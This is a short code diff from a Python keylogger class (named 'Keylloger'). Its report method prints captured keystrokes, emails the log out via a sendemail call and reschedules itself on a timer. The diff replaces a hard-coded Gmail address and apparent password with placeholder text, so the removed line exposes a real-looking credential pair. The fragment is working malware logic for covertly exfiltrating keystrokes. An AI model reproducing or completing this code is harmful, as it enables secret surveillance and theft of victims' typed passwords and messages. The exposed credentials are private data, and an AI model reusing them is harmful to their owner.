@@ -37,7 +37,7 @@ class Keylloger:
 
 	def report(self):
 		print(self.log)
-		self.sendemail("majjadolaya@gmail.com", "beoutforyou2003", "\n\n" + self.log)
+		self.sendemail("your email account here", "your password here", "\n\n" + self.log)
 		self.log = "" 
 		timer = threading.Timer(self.interval, self.report)
 		timer.start()
